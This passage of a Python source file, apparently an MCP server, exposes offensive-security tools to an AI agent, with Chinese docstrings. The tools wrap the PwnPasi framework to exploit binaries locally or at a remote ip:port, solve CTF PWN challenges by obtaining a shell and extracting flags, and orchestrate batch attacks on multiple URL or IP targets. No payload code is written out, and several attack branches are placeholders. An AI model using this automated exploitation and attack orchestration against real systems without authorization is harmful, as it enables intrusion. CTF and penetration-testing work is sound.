                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "partial_results": poc_result,
                    "message": "智能攻击过程中出现错误，但已生成部分结果"
                }
            except:
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "message": "智能攻击失败"
                }

    # ==================== PwnPasi PWN自动化工具集成 ====================

    @mcp.tool()
    def ctf_pwn_solver(binary_path: str, challenge_name: str = "", challenge_hints: List[str] = None,
                      time_limit: str = "quick") -> Dict[str, Any]:
        """
        CTF PWN题目自动求解器 - 专门针对CTF比赛的PWN题目

        综合使用PwnPasi和逆向分析技术，自动解决CTF PWN题目：
        1. 二进制保护分析
        2. 漏洞类型识别
        3. 利用策略选择
        4. 自动化攻击执行
        5. Flag提取和验证

        Args:
            binary_path: CTF PWN题目二进制文件路径
            challenge_name: 题目名称（用于记录）
            challenge_hints: 题目提示列表
            time_limit: 时间限制（quick, standard, thorough）

        Returns:
            CTF PWN求解结果，包含Flag和解题过程
        """
        if not challenge_hints:
            challenge_hints = []

        results = {
            "binary_path": binary_path,
            "challenge_name": challenge_name or f"PWN_Challenge_{os.path.basename(binary_path)}",
            "challenge_hints": challenge_hints,
            "time_limit": time_limit,
            "analysis_steps": {},
            "exploitation_attempts": [],
            "flags_found": [],
            "success": False
        }

        try:
            # 启用CTF模式
            enable_ctf_mode()

            # 第一步：二进制分析
            logger.info(f"Step 1: Binary analysis for {binary_path}")
            if os.path.exists(binary_path):
                # 使用逆向分析工具分析二进制
                binary_analysis = auto_reverse_analyze(binary_path)
                results["analysis_steps"]["1_binary_analysis"] = binary_analysis

                # 第二步：PwnPasi自动化攻击
                logger.info(f"Step 2: PwnPasi automated exploitation")
                pwn_result = pwnpasi_auto_pwn(binary_path, verbose=True)
                results["exploitation_attempts"].append({
                    "tool": "pwnpasi",
                    "result": pwn_result,
                    "timestamp": datetime.datetime.now().isoformat()
                })

                # 检查是否获得shell
                if pwn_result.get("exploitation_result") == "shell_obtained":
                    results["success"] = True
                    results["shell_access"] = True

                    # 尝试提取Flag（从输出中查找）
                    stdout_content = pwn_result.get("stdout", "")
                    flag_patterns = [
                        r"flag\{[^}]+\}",
                        r"FLAG\{[^}]+\}",
                        r"ctf\{[^}]+\}",
                        r"CTF\{[^}]+\}"
                    ]

                    import re
                    for pattern in flag_patterns:
                        matches = re.findall(pattern, stdout_content, re.IGNORECASE)
                        for match in matches:
                            if match not in results["flags_found"]:
                                results["flags_found"].append(match)

                # 第三步：如果PwnPasi失败，尝试其他方法
                if not results["success"] and time_limit in ["standard", "thorough"]:
                    logger.info("Step 3: Alternative exploitation methods")

                    # 可以在这里添加其他PWN技术
                    # 比如手动ROP链构造、格式化字符串利用等
                    pass

            else:
                results["error"] = f"Binary file not found: {binary_path}"
                return results

            # 获取CTF模式下检测到的所有Flag
            detected_flags = get_detected_flags()
            if detected_flags.get("success"):
                ctf_flags = detected_flags.get("flags", [])
                for flag_info in ctf_flags:
                    flag_content = flag_info.get("flag", "")
                    if flag_content and flag_content not in results["flags_found"]:
                        results["flags_found"].append(flag_content)

            results["total_flags_found"] = len(results["flags_found"])
            results["message"] = f"CTF PWN solver completed - Found {results['total_flags_found']} flags"

            return results

        except Exception as e:
            logger.error(f"CTF PWN solver error: {str(e)}")
            results["success"] = False
            results["error"] = str(e)
            results["message"] = "CTF PWN solver failed"
            return results

    @mcp.tool()
    def quick_pwn_check(binary_path: str) -> Dict[str, Any]:
        """
        快速PWN漏洞检查 - 快速识别二进制文件的PWN攻击可能性

        执行快速分析来判断二进制文件是否容易受到PWN攻击：
        - 二进制保护分析 (RELRO, Canary, NX, PIE)
        - 危险函数检测 (gets, strcpy, sprintf等)
        - 栈溢出可能性分析
        - 利用难度评估

        Args:
            binary_path: 要分析的二进制文件路径

        Returns:
            快速PWN分析结果，包含攻击可能性评估和建议的攻击方法
        """
        import subprocess

        results = {
            "binary_path": binary_path,
            "analysis_timestamp": datetime.datetime.now().isoformat(),
            "protections": {},
            "vulnerable_functions": [],
            "attack_surface": [],
            "difficulty_assessment": "unknown",
            "recommended_methods": [],
            "quick_attack_possible": False
        }

        try:
            if not os.path.exists(binary_path):
                results["error"] = f"Binary file not found: {binary_path}"
                return results

            # 1. 检查二进制保护
            try:
                checksec_cmd = ["checksec", "--file", binary_path]
                checksec_result = subprocess.run(checksec_cmd, capture_output=True, text=True, timeout=30)
                if checksec_result.returncode == 0:
                    output = checksec_result.stdout
                    results["protections"]["raw_output"] = output

                    # 解析保护状态
                    protections_status = {
                        "relro": "No RELRO" in output or "Partial RELRO" in output,
                        "canary": "No canary found" in output,
                        "nx": "NX disabled" in output,
                        "pie": "No PIE" in output
                    }
                    results["protections"]["status"] = protections_status

                    # 评估攻击难度
                    disabled_protections = sum(1 for disabled in protections_status.values() if disabled)
                    if disabled_protections >= 3:
                        results["difficulty_assessment"] = "easy"
                        results["quick_attack_possible"] = True
                    elif disabled_protections >= 2:
                        results["difficulty_assessment"] = "medium"
                    else:
                        results["difficulty_assessment"] = "hard"

            except subprocess.TimeoutExpired:
                results["protections"]["error"] = "checksec timeout"
            except FileNotFoundError:
                results["protections"]["error"] = "checksec not found"

            # 2. 检查危险函数
            try:
                strings_cmd = ["strings", binary_path]
                strings_result = subprocess.run(strings_cmd, capture_output=True, text=True, timeout=30)

                dangerous_functions = [
                    "gets", "strcpy", "strcat", "sprintf", "vsprintf",
                    "scanf", "fscanf", "sscanf", "strncpy", "strncat"
                ]

                if strings_result.returncode == 0:
                    output = strings_result.stdout
                    for func in dangerous_functions:
                        if func in output:
                            results["vulnerable_functions"].append(func)

            except subprocess.TimeoutExpired:
                results["vulnerable_functions_error"] = "strings timeout"
            except FileNotFoundError:
                results["vulnerable_functions_error"] = "strings not found"

            # 3. 生成攻击建议
            if results["quick_attack_possible"]:
                results["recommended_methods"] = ["pwnpasi_auto", "ret2system", "ret2libc"]
                results["attack_surface"] = ["stack_overflow", "format_string"]
            elif results["difficulty_assessment"] == "medium":
                results["recommended_methods"] = ["pwnpasi_auto", "rop_chain"]
                results["attack_surface"] = ["stack_overflow"]
            else:
                results["recommended_methods"] = ["advanced_rop", "heap_exploitation"]
                results["attack_surface"] = ["complex_exploitation"]

            results["success"] = True
            results["summary"] = {
                "attack_possible": results["quick_attack_possible"],
                "difficulty": results["difficulty_assessment"],
                "vulnerable_functions_count": len(results["vulnerable_functions"]),
                "recommended_tool": "pwnpasi" if results["quick_attack_possible"] else "manual_exploitation"
            }

            return results

        except Exception as e:
            logger.error(f"Quick PWN check error: {str(e)}")
            results["success"] = False
            results["error"] = str(e)
            return results

    @mcp.tool()
    def pwnpasi_auto_pwn(binary_path: str, remote_ip: str = "", remote_port: int = 0,
                        libc_path: str = "", padding: int = 0, verbose: bool = False,
                        additional_args: str = "") -> Dict[str, Any]:
        """
        执行PwnPasi自动化二进制漏洞利用

        PwnPasi是一个专业的自动化二进制利用框架，支持多种利用技术：
        - 自动栈溢出检测和利用
        - ret2system, ret2libc, ROP链构造
        - 二进制保护绕过 (RELRO, Canary, NX, PIE)
        - 本地和远程利用模式
        - 智能填充计算和libc版本检测

        Args:
            binary_path: 目标二进制文件路径 (必需)
            remote_ip: 远程目标IP地址 (可选，用于远程利用)
            remote_port: 远程目标端口 (可选，与remote_ip配合使用)
            libc_path: 自定义libc库路径 (可选)
            padding: 手动指定溢出填充大小 (可选)
            verbose: 启用详细输出模式
            additional_args: 额外的pwnpasi参数

        Returns:
            PwnPasi利用结果，包含利用过程、发现的漏洞和获取的Shell信息
        """
        data = {
            "binary_path": binary_path,
            "remote_ip": remote_ip,
            "remote_port": remote_port,
            "libc_path": libc_path,
            "padding": padding,
            "verbose": verbose,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("pwnpasi", data)

    @mcp.tool()
    def pwn_comprehensive_attack(binary_path: str, attack_methods: List[str] = None,
                               remote_target: str = "", timeout: int = 300) -> Dict[str, Any]:
        """
        综合PWN攻击 - 使用多种方法尝试利用二进制文件

        结合多种PWN攻击技术，包括PwnPasi自动化利用和其他手动技术：
        - pwnpasi_auto: 使用PwnPasi自动化利用
        - ret2libc: ret2libc攻击链
        - rop_chain: ROP链构造攻击
        - shellcode_injection: 直接shellcode注入
        - format_string: 格式化字符串攻击

        Args:
            binary_path: 目标二进制文件路径
            attack_methods: 要尝试的攻击方法列表 (默认: ["pwnpasi_auto", "ret2libc"])
            remote_target: 远程目标地址 (格式: ip:port)
            timeout: 单个攻击方法的超时时间 (秒)

        Returns:
            综合攻击结果，包含每种方法的执行结果和成功的利用方式
        """
        if attack_methods is None:
            attack_methods = ["pwnpasi_auto", "ret2libc"]

        results = {
            "binary_path": binary_path,
            "attack_methods": attack_methods,
            "remote_target": remote_target,
            "timestamp": datetime.datetime.now().isoformat(),
            "attempts": [],
            "successful_methods": [],
            "failed_methods": [],
            "overall_success": False
        }

        # 解析远程目标
        remote_ip, remote_port = "", 0
        if remote_target and ":" in remote_target:
            try:
                remote_ip, port_str = remote_target.split(":", 1)
                remote_port = int(port_str)
            except ValueError:
                results["error"] = f"Invalid remote target format: {remote_target}. Use ip:port format."
                return results

        for method in attack_methods:
            attempt = {
                "method": method,
                "start_time": datetime.datetime.now().isoformat(),
                "success": False,
                "output": "",
                "error": ""
            }

            try:
                if method == "pwnpasi_auto":
                    # 使用PwnPasi自动化利用
                    result = pwnpasi_auto_pwn(
                        binary_path=binary_path,
                        remote_ip=remote_ip,
                        remote_port=remote_port,
                        verbose=True
                    )
                    attempt["output"] = result.get("output", "")
                    attempt["success"] = result.get("success", False)
                    if not attempt["success"] and "error" in result:
                        attempt["error"] = result["error"]

                elif method == "ret2libc":
                    # 这里可以集成其他ret2libc工具或脚本
                    attempt["output"] = "ret2libc attack method placeholder - implement specific ret2libc logic"
                    attempt["success"] = False
                    attempt["error"] = "ret2libc method not yet implemented"

                elif method == "rop_chain":
                    # 这里可以集成ROP链构造工具
                    attempt["output"] = "ROP chain attack method placeholder - implement specific ROP logic"
                    attempt["success"] = False
                    attempt["error"] = "ROP chain method not yet implemented"

                else:
                    attempt["error"] = f"Unknown attack method: {method}"

                if attempt["success"]:
                    results["successful_methods"].append(method)
                    results["overall_success"] = True
                else:
                    results["failed_methods"].append(method)

            except Exception as e:
                attempt["error"] = str(e)
                results["failed_methods"].append(method)

            attempt["end_time"] = datetime.datetime.now().isoformat()
            results["attempts"].append(attempt)

            # 如果成功了，可以选择继续尝试其他方法或停止
            if attempt["success"] and len(results["successful_methods"]) >= 1:
                results["note"] = "Stopped after first successful exploit"
                break

        return results

    @mcp.tool()
    def multi_target_add_target(target_url: str, target_type: str = "unknown",
                               priority: int = 1, dependencies: str = "") -> Dict[str, Any]:
        """
        添加新目标到多目标协调系统

        Args:
            target_url: 目标URL或IP地址
            target_type: 目标类型 (web, network, mobile, cloud)
            priority: 优先级 (1-10, 10为最高)
            dependencies: 依赖的其他目标ID，逗号分隔

        Returns:
            包含目标ID和状态的字典
        """
        try:
            dep_list = [dep.strip() for dep in dependencies.split(",")] if dependencies else []
            target_id = multi_target_orchestrator.add_target(
                target_url=target_url,
                target_type=target_type,
                priority=priority,
                dependencies=dep_list
            )

            return {
                "success": True,
                "target_id": target_id,
                "target_url": target_url,
                "target_type": target_type,
                "priority": priority,
                "dependencies": dep_list,
                "message": f"目标 {target_url} 已添加到协调系统"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "添加目标失败"
            }

    @mcp.tool()
    def multi_target_orchestrate(strategy: str = "adaptive") -> Dict[str, Any]:
        """
        执行多目标攻击编排

        Args:
            strategy: 编排策略 (sequential, parallel, adaptive, dependency_aware)

        Returns:
            包含执行计划的详细信息
        """
        try:
            orchestration_result = multi_target_orchestrator.orchestrate_attack(strategy)

            return {
                "success": True,
                "orchestration_plan": orchestration_result,
                "message": f"使用 {strategy} 策略生成执行计划"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "编排执行失败"
            }

    @mcp.tool()
    def multi_target_get_status() -> Dict[str, Any]:
        """
        获取多目标协调系统状态

        Returns:
            包含系统状态的详细信息
        """
        try:
            status = multi_target_orchestrator.get_orchestration_status()

            return {
                "success": True,
                "status": status,
                "message": "系统状态获取成功"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "获取状态失败"
            }

    @mcp.tool()
    def multi_target_execute_batch(target_ids: str = "", max_concurrent: int = 3) -> Dict[str, Any]:
        """
        批量执行多目标攻击任务

        Args:
            target_ids: 目标ID列表，逗号分隔（空则执行所有）
            max_concurrent: 最大并发任务数

        Returns:
            批量执行结果
        """
        try:
            # 解析目标ID列表
            if target_ids:
                target_list = [tid.strip() for tid in target_ids.split(",")]
            else:
                target_list = list(multi_target_orchestrator.targets.keys())

            # 更新并发限制
            multi_target_orchestrator.max_concurrent_tasks = max_concurrent

            # 执行编排
            orchestration_result = multi_target_orchestrator.orchestrate_attack("adaptive")

            # 模拟批量执行
            execution_summary = {
                "total_targets": len(target_list),
                "execution_strategy": orchestration_result["orchestration_strategy"],
                "estimated_time": orchestration_result["estimated_total_time"],
                "phases": len(orchestration_result["execution_plan"].get("execution_phases", [])),
                "concurrent_limit": max_concurrent
            }

            return {
                "success": True,
                "execution_summary": execution_summary,
                "orchestration_plan": orchestration_result,
                "message": f"批量执行已启动，涉及 {len(target_list)} 个目标"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "批量执行失败"
            }

    # ==================== 高级上下文关联和模式识别工具 ====================

    @mcp.tool()
    def analyze_context_patterns(session_history: str, current_context: str = "{}") -> Dict[str, Any]:
        """
        分析上下文模式和关联，发现行为模式并生成预测建议

        Args:
            session_history: 会话历史，JSON格式字符串
            current_context: 当前上下文，JSON格式字符串

        Returns:
            包含模式分析结果的字典
        """
        try:
            import json

            # 解析输入参数
            try:
                history_data = json.loads(session_history) if session_history else []
                context_data = json.loads(current_context) if current_context else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式数据"
                }

            # 执行上下文模式分析
            analysis_results = advanced_context_analyzer.analyze_context_patterns(
                session_history=history_data,
                current_context=context_data
            )

            return {
                "success": True,
                "analysis_results": analysis_results,
                "message": "上下文模式分析完成"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "上下文模式分析失败"
            }

    @mcp.tool()
    def get_pattern_repository() -> Dict[str, Any]:
        """
        获取已发现的模式库信息

        Returns:
            包含模式库统计信息的字典
        """
        try:
            patterns_info = []

            for pattern_name, pattern in advanced_context_analyzer.pattern_repository.items():
                patterns_info.append({
                    "pattern_id": pattern.pattern_id,
                    "pattern_name": pattern.pattern_name,
                    "pattern_type": pattern.pattern_type,
                    "occurrence_count": pattern.occurrence_count,
                    "success_rate": pattern.success_rate,
                    "confidence_score": pattern.confidence_score,
                    "associated_strategies": pattern.associated_strategies,
                    "last_seen": pattern.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
                    "pattern_signature": pattern.pattern_signature
                })

            return {
                "success": True,
                "patterns": patterns_info,
                "total_patterns": len(patterns_info),
                "repository_stats": {
                    "total_patterns": len(patterns_info),
                    "high_confidence_patterns": len([p for p in patterns_info if p["confidence_score"] > 0.7]),
                    "pattern_types": list(set(p["pattern_type"] for p in patterns_info))
                },
                "message": f"模式库包含 {len(patterns_info)} 个已识别模式"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "获取模式库信息失败"
            }

    @mcp.tool()
    def predict_next_action(current_context: str, session_history: str = "[]") -> Dict[str, Any]:
        """
        基于上下文模式预测下一步最佳行动

        Args:
            current_context: 当前上下文，JSON格式字符串
            session_history: 会话历史，JSON格式字符串

        Returns:
            包含预测建议的字典
        """
        try:
            import json

            # 解析输入参数
            try:
                context_data = json.loads(current_context) if current_context else {}
                history_data = json.loads(session_history) if session_history else []
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式数据"
                }

            # 分析上下文模式
            analysis_results = advanced_context_analyzer.analyze_context_patterns(
                session_history=history_data,
                current_context=context_data
            )

            # 提取预测建议
            recommendations = analysis_results.get("predictive_recommendations", [])

            # 根据置信度排序建议
            recommendations.sort(key=lambda x: x.get("confidence", 0), reverse=True)

            # 选择最佳建议
            best_recommendation = recommendations[0] if recommendations else {
                "type": "default",
                "suggestion": "建议执行基础扫描以收集更多信息",
                "confidence": 0.5,
                "reasoning": "缺乏足够的历史数据进行精确预测"
            }

            return {
                "success": True,
                "predicted_action": best_recommendation,
                "all_recommendations": recommendations,
                "context_analysis": {
                    "patterns_found": len(analysis_results.get("discovered_patterns", [])),
                    "correlations_found": len(analysis_results.get("strong_correlations", [])),
                    "confidence_level": best_recommendation.get("confidence", 0)
                },
                "message": f"基于上下文分析，推荐执行: {best_recommendation.get('suggestion', '未知')}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "预测分析失败"
            }

    @mcp.tool()
    def analyze_tool_effectiveness(tool_name: str, session_history: str = "[]") -> Dict[str, Any]:
        """
        分析特定工具在不同上下文中的效果

        Args:
            tool_name: 工具名称
            session_history: 会话历史，JSON格式字符串

        Returns:
            包含工具效果分析的字典
        """
        try:
            import json

            # 解析会话历史
            try:
                history_data = json.loads(session_history) if session_history else []
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式会话历史"
                }

            # 分析工具使用情况
            tool_usage_stats = {
                "total_usage": 0,
                "success_count": 0,
                "failure_count": 0,
                "success_rate": 0.0,
                "usage_contexts": [],
                "effectiveness_by_context": {}
            }

            for entry in history_data:
                tools_used = entry.get("tools_used", [])
                outcome = entry.get("outcome", "unknown")
                context_type = entry.get("target_type", "unknown")

                if tool_name in tools_used:
                    tool_usage_stats["total_usage"] += 1

                    context_info = {
                        "context_type": context_type,
                        "outcome": outcome,
                        "timestamp": entry.get("timestamp", "unknown")
                    }
                    tool_usage_stats["usage_contexts"].append(context_info)

                    if outcome == "success":
                        tool_usage_stats["success_count"] += 1
                    elif outcome == "failure":
                        tool_usage_stats["failure_count"] += 1

                    # 按上下文类型统计
                    if context_type not in tool_usage_stats["effectiveness_by_context"]:
                        tool_usage_stats["effectiveness_by_context"][context_type] = {
                            "usage": 0, "success": 0, "failure": 0
                        }

                    tool_usage_stats["effectiveness_by_context"][context_type]["usage"] += 1
                    if outcome == "success":
                        tool_usage_stats["effectiveness_by_context"][context_type]["success"] += 1
                    elif outcome == "failure":
                        tool_usage_stats["effectiveness_by_context"][context_type]["failure"] += 1

            # 计算成功率
            if tool_usage_stats["total_usage"] > 0:
                tool_usage_stats["success_rate"] = (
                    tool_usage_stats["success_count"] / tool_usage_stats["total_usage"]
                )

            # 计算各上下文中的成功率
            for context_type, stats in tool_usage_stats["effectiveness_by_context"].items():
                if stats["usage"] > 0:
                    stats["success_rate"] = stats["success"] / stats["usage"]

            return {
                "success": True,
                "tool_name": tool_name,
                "effectiveness_analysis": tool_usage_stats,
                "recommendations": self._generate_tool_recommendations(tool_name, tool_usage_stats),
                "message": f"工具 {tool_name} 效果分析完成"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "工具效果分析失败"
            }

    def _generate_tool_recommendations(self, tool_name: str, stats: Dict[str, Any]) -> List[str]:
        """生成工具使用建议"""
        recommendations = []

        if stats["total_usage"] == 0:
            recommendations.append(f"工具 {tool_name} 尚未使用，建议在适当场景下尝试")
        elif stats["success_rate"] > 0.8:
            recommendations.append(f"工具 {tool_name} 表现优秀，成功率 {stats['success_rate']:.1%}，推荐继续使用")
        elif stats["success_rate"] < 0.3:
            recommendations.append(f"工具 {tool_name} 成功率较低 ({stats['success_rate']:.1%})，建议检查使用方法或更换工具")
        else:
            recommendations.append(f"工具 {tool_name} 表现中等，成功率 {stats['success_rate']:.1%}")

        # 基于上下文的建议
        best_contexts = []
        worst_contexts = []

        for context, context_stats in stats["effectiveness_by_context"].items():
            if context_stats.get("success_rate", 0) > 0.8:
                best_contexts.append(context)
            elif context_stats.get("success_rate", 0) < 0.3:
                worst_contexts.append(context)

        if best_contexts:
            recommendations.append(f"在 {', '.join(best_contexts)} 类型目标中表现最佳")

        if worst_contexts:
            recommendations.append(f"在 {', '.join(worst_contexts)} 类型目标中效果较差，建议避免使用")

        return recommendations

    # ==================== 攻击智能知识图谱工具 ====================

    @mcp.tool()
    def knowledge_graph_query_nodes(node_type: str = "", name_pattern: str = "",
                                   min_confidence: float = 0.0) -> Dict[str, Any]:
        """
        查询知识图谱中的节点

        Args:
            node_type: 节点类型 (target, tool, vulnerability, technique, strategy)
            name_pattern: 名称模式匹配
            min_confidence: 最小置信度阈值

        Returns:
            包含查询结果的字典
        """
        try:
            nodes = attack_knowledge_graph.query_nodes(
                node_type=node_type if node_type else None,
                name_pattern=name_pattern if name_pattern else None,
                min_confidence=min_confidence
            )

            return {
                "success": True,
                "nodes": nodes,
                "total_count": len(nodes),
                "query_params": {
                    "node_type": node_type,
                    "name_pattern": name_pattern,
                    "min_confidence": min_confidence
                },
                "message": f"查询到 {len(nodes)} 个匹配的知识节点"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "知识图谱节点查询失败"
            }

    @mcp.tool()
    def knowledge_graph_recommend_tools(target_properties: str) -> Dict[str, Any]:
        """
        根据目标特征推荐最佳工具

        Args:
            target_properties: 目标属性，JSON格式字符串

        Returns:
            包含工具推荐的字典
        """
        try:
            import json

            # 解析目标属性
            try:
                target_props = json.loads(target_properties) if target_properties else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式目标属性"
                }

            recommendations = attack_knowledge_graph.recommend_tools_for_target(target_props)

            return {
                "success": True,
                "recommendations": recommendations,
                "total_count": len(recommendations),
                "target_properties": target_props,
                "message": f"根据目标特征推荐了 {len(recommendations)} 个工具"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "工具推荐失败"
            }

    @mcp.tool()
    def knowledge_graph_add_node(node_type: str, node_name: str, properties: str = "{}",
                                confidence: float = 0.5, tags: str = "") -> Dict[str, Any]:
        """
        向知识图谱添加新节点

        Args:
            node_type: 节点类型
            node_name: 节点名称
            properties: 节点属性，JSON格式字符串
            confidence: 置信度 (0.0-1.0)
            tags: 标签，逗号分隔

        Returns:
            包含添加结果的字典
        """
        try:
            import json

            # 解析属性
            try:
                props = json.loads(properties) if properties else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式属性"
                }

            # 解析标签
            tag_list = [tag.strip() for tag in tags.split(",")] if tags else []

            node_id = attack_knowledge_graph.add_node(
                node_type=node_type,
                node_name=node_name,
                properties=props,
                confidence=confidence,
                tags=tag_list
            )

            return {
                "success": True,
                "node_id": node_id,
                "node_type": node_type,
                "node_name": node_name,
                "properties": props,
                "confidence": confidence,
                "tags": tag_list,
                "message": f"成功添加知识节点: {node_name}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "添加知识节点失败"
            }

    @mcp.tool()
    def knowledge_graph_add_relation(source_node_id: str, target_node_id: str,
                                   relation_type: str, strength: float = 0.5,
                                   properties: str = "{}") -> Dict[str, Any]:
        """
        在知识图谱中添加节点关系

        Args:
            source_node_id: 源节点ID
            target_node_id: 目标节点ID
            relation_type: 关系类型
            strength: 关系强度 (0.0-1.0)
            properties: 关系属性，JSON格式字符串

        Returns:
            包含添加结果的字典
        """
        try:
            import json

            # 解析属性
            try:
                props = json.loads(properties) if properties else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式关系属性"
                }

            relation_id = attack_knowledge_graph.add_relation(
                source_node_id=source_node_id,
                target_node_id=target_node_id,
                relation_type=relation_type,
                strength=strength,
                properties=props
            )

            return {
                "success": True,
                "relation_id": relation_id,
                "source_node_id": source_node_id,
                "target_node_id": target_node_id,
                "relation_type": relation_type,
                "strength": strength,
                "properties": props,
                "message": f"成功添加关系: {relation_type}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "添加关系失败"
            }

    @mcp.tool()
    def knowledge_graph_get_statistics() -> Dict[str, Any]:
        """
        获取知识图谱统计信息

        Returns:
            包含图谱统计信息的字典
        """
        try:
            stats = attack_knowledge_graph.get_knowledge_statistics()

            return {
                "success": True,
                "statistics": stats,
                "insights": {
                    "most_common_node_type": max(stats["nodes_by_type"].items(), key=lambda x: x[1])[0] if stats["nodes_by_type"] else "无",
                    "most_common_relation_type": max(stats["relations_by_type"].items(), key=lambda x: x[1])[0] if stats["relations_by_type"] else "无",
                    "knowledge_richness": "丰富" if stats["total_nodes"] > 20 else "基础"
                },
                "message": f"知识图谱包含 {stats['total_nodes']} 个节点和 {stats['total_relations']} 个关系"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "获取知识图谱统计信息失败"
            }

    @mcp.tool()
    def knowledge_graph_smart_recommendation(current_context: str, session_history: str = "[]") -> Dict[str, Any]:
        """
        基于知识图谱的智能推荐

        Args:
            current_context: 当前上下文，JSON格式字符串
            session_history: 会话历史，JSON格式字符串

        Returns:
            包含智能推荐的字典
        """
        try:
            import json

            # 解析输入参数
            try:
                context_data = json.loads(current_context) if current_context else {}
                history_data = json.loads(session_history) if session_history else []
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式数据"
                }

            # 基于知识图谱推荐工具
            tool_recommendations = attack_knowledge_graph.recommend_tools_for_target(context_data)

            # 结合上下文分析增强推荐
            if history_data:
                # 分析历史成功模式
                successful_tools = []
                for entry in history_data:
                    if entry.get("outcome") == "success":
                        successful_tools.extend(entry.get("tools_used", []))

                # 调整推荐权重
                for rec in tool_recommendations:
                    if rec["tool_name"] in successful_tools:
                        rec["effectiveness_score"] = min(rec["effectiveness_score"] * 1.2, 1.0)
                        rec["reasoning"] += " (历史表现良好)"

            # 重新排序
            tool_recommendations.sort(key=lambda x: x["effectiveness_score"], reverse=True)

            return {
                "success": True,
                "tool_recommendations": tool_recommendations[:5],  # 返回前5个
                "knowledge_insights": {
                    "recommendation_count": len(tool_recommendations),
                    "confidence_level": sum(r["effectiveness_score"] for r in tool_recommendations[:3]) / 3 if tool_recommendations else 0,
                    "knowledge_coverage": "基于攻击知识图谱的专业推荐"
                },
                "message": f"基于知识图谱和历史经验，推荐 {len(tool_recommendations[:5])} 个最佳工具"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "智能推荐失败"
            }

    # ==================== 自适应执行引擎工具 ====================

    @mcp.tool()
    def adaptive_create_execution_context(session_id: str, target_info: str,
                                         initial_strategy: str = "auto") -> Dict[str, Any]:
        """
        创建自适应执行上下文

        Args:
            session_id: 会话ID
            target_info: 目标信息，JSON格式字符串
            initial_strategy: 初始策略名称

        Returns:
            包含执行上下文信息的字典
        """
        try:
            import json

            # 解析目标信息
            try:
                target_data = json.loads(target_info) if target_info else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式目标信息"
                }

            context_id = adaptive_execution_engine.create_execution_context(
                session_id=session_id,
                target_info=target_data,
                initial_strategy=initial_strategy
            )

            return {
                "success": True,
                "context_id": context_id,
                "session_id": session_id,
                "target_info": target_data,
                "initial_strategy": initial_strategy,
                "execution_state": "planning",
                "message": f"成功创建执行上下文: {context_id}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "创建执行上下文失败"
            }

    @mcp.tool()
    def adaptive_execute_strategy(context_id: str, strategy_name: str = "") -> Dict[str, Any]:
        """
        执行自适应策略

        Args:
            context_id: 执行上下文ID
            strategy_name: 策略名称（可选，为空则自动选择）

        Returns:
            包含执行结果的字典
        """
        try:
            result = adaptive_execution_engine.execute_adaptive_strategy(
                context_id=context_id,
                strategy_name=strategy_name if strategy_name else None
            )

            if not result.get("success", False):
                return {
                    "success": False,
                    "error": result.get("error", "未知错误"),
                    "message": "策略执行失败"
                }

            return {
                "success": True,
                "execution_result": result,
                "message": f"策略 {result['strategy_name']} 执行完成，性能评分: {result['performance_score']:.2f}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "自适应策略执行失败"
            }

    @mcp.tool()
    def adaptive_get_execution_status(context_id: str) -> Dict[str, Any]:
        """
        获取执行上下文状态

        Args:
            context_id: 执行上下文ID

        Returns:
            包含执行状态的字典
        """
        try:
            status = adaptive_execution_engine.get_execution_status(context_id)

            if "error" in status:
                return {
                    "success": False,
                    "error": status["error"],
                    "message": "获取执行状态失败"
                }

            return {
                "success": True,
                "status": status,
                "message": f"上下文 {context_id} 当前状态: {status['execution_state']}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "获取执行状态失败"
            }

    @mcp.tool()
    def adaptive_get_insights(context_id: str) -> Dict[str, Any]:
        """
        获取自适应执行洞察

        Args:
            context_id: 执行上下文ID

        Returns:
            包含适应性洞察的字典
        """
        try:
            insights = adaptive_execution_engine.get_adaptation_insights(context_id)

            if "error" in insights:
                return {
                    "success": False,
                    "error": insights["error"],
                    "message": "获取适应性洞察失败"
                }

            return {
                "success": True,
                "insights": insights,
                "message": insights["message"]
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "获取适应性洞察失败"
            }

    @mcp.tool()
    def adaptive_intelligent_orchestration(target_list: str, orchestration_mode: str = "balanced") -> Dict[str, Any]:
        """
